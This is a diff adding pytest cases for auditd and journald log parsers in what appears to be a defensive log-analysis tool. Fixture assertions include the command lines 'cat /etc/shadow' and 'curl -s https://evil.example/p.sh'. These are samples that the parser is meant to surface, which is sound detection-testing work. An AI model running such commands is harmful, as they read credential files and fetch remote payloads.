@@ -9,13 +9,17 @@ from pathlib import Path
 
 import pytest
 
+from bastion.ingest.auditd import AuditdSource
 from bastion.ingest.base import select_source
 from bastion.ingest.evtx import EvtxSource, xml_to_event
+from bastion.ingest.journald import JournaldSource
 from bastion.ingest.linux import LinuxLogSource
 from bastion.models import Event
 
 FIXTURES = Path(__file__).parent / "fixtures"
 AUTH_LOG = FIXTURES / "auth_sample.log"
+AUDIT_LOG = FIXTURES / "audit_sample.log"
+JOURNAL_LOG = FIXTURES / "journald_sample.jsonl"
 SYSMON_XML = (FIXTURES / "sysmon_process_creation.xml").read_text(encoding="utf-8")
 
 
@@ -150,7 +154,71 @@ class TestEvtxSource:
         assert any("unreadable record" in record.message for record in caplog.records)
 
 
+class TestAuditdSource:
+    def test_groups_records_by_audit_id(self, caplog: pytest.LogCaptureFixture) -> None:
+        with caplog.at_level(logging.WARNING):
+            events = list(AuditdSource().parse(AUDIT_LOG))
+        assert len(events) == 3  # three audit ids in the fixture
+        assert any("malformed auditd line" in record.message for record in caplog.records)
+
+    def test_syscall_and_execve_records_are_merged(self) -> None:
+        event = next(iter(AuditdSource().parse(AUDIT_LOG)))
+        assert event.platform == "linux"
+        assert event.fields["Image"] == "/usr/bin/cat"
+        assert event.fields["exe"] == "/usr/bin/cat"
+        assert event.fields["comm"] == "cat"
+        assert event.fields["CommandLine"] == "cat /etc/shadow"
+        assert event.fields["key"] == "creds"
+        assert event.fields["cwd"] == "/root"
+        assert event.fields["type"] == "SYSCALL"
+        assert event.timestamp is not None
+        assert event.timestamp == datetime.fromtimestamp(1780000000.101, tz=UTC)
+        assert "type=EXECVE" in event.raw
+
+    def test_hex_encoded_argument_is_decoded(self) -> None:
+        event = list(AuditdSource().parse(AUDIT_LOG))[1]
+        assert event.fields["CommandLine"] == "curl -s https://evil.example/p.sh"
+
+
+class TestJournaldSource:
+    def test_parses_json_lines_and_skips_garbage(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        with caplog.at_level(logging.WARNING):
+            events = list(JournaldSource().parse(JOURNAL_LOG))
+        assert len(events) == 3  # one non-JSON line and one binary message skipped
+        messages = [record.message for record in caplog.records]
+        assert any("non-JSON" in message for message in messages)
+        assert any("without text" in message for message in messages)
+
+    def test_fields_and_timestamp(self) -> None:
+        event = next(iter(JournaldSource().parse(JOURNAL_LOG)))
+        assert event.fields["process"] == "sshd"
+        assert event.fields["pid"] == 412
+        assert event.fields["host"] == "web01"
+        assert event.fields["user"] == "admin"
+        assert event.timestamp == datetime.fromtimestamp(1780000500, tz=UTC)
+
+    def test_syslog_identifier_fallback_and_sudo_user(self) -> None:
+        event = list(JournaldSource().parse(JOURNAL_LOG))[1]
+        assert event.fields["process"] == "sudo"
+        assert event.fields["user"] == "alice"
+
+
 class TestSelectSource:
+    def test_sniffs_auditd_from_content(self) -> None:
+        assert isinstance(select_source(AUDIT_LOG), AuditdSource)
+
+    def test_sniffs_plain_syslog_from_content(self) -> None:
+        assert isinstance(select_source(AUTH_LOG), LinuxLogSource)
+
+    def test_jsonl_extension_picks_journald(self) -> None:
+        assert isinstance(select_source(JOURNAL_LOG), JournaldSource)
+
+    def test_json_content_in_dot_log_picks_journald(self, tmp_path: Path) -> None:
+        log = tmp_path / "export.log"
+        log.write_text('{"MESSAGE": "hello"}\n', encoding="utf-8")
+        assert isinstance(select_source(log), JournaldSource)
     def test_evtx_extension_wins(self) -> None:
         assert isinstance(select_source(Path("logs.evtx")), EvtxSource)
 
